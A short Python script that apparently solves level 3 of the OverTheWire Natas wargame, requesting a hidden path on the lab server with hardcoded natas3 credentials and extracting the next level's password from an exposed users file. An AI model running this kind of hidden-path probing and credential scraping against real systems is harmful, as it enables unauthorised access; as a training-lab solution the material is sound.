import requests
import re

user = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
url = "http://natas3.natas.labs.overthewire.org"

response = requests.get(url+"/s3cr3t/users.txt",auth=(user,password))
content = response.text

print(re.findall("natas4:(.*)",content)[0])
